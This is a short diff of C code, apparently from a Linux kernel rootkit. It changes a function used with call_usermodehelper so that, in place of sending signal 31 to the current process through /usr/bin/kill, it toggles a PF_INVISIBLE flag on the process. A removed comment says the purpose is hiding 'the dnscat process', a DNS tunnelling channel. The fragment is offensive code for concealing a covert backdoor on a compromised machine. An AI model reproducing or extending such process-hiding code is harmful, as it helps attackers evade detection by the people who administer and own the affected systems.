@@ -125,14 +125,10 @@ out:
 	return ret;
 }
 
-// hiding the dnscat process, one of the worst ways possible to do it but who cares, it works
+// hiding the process
 static int init_func(struct subprocess_info *info, struct cred *new)
 {
-		char pid_str[12];
-		sprintf(pid_str, "%d", current->pid);
-		char *argv[] = {"/usr/bin/kill", "-31", NULL, NULL};
-		argv[2] = pid_str;
-        call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+		current->flags ^= PF_INVISIBLE;
 		return 0;
 }
 
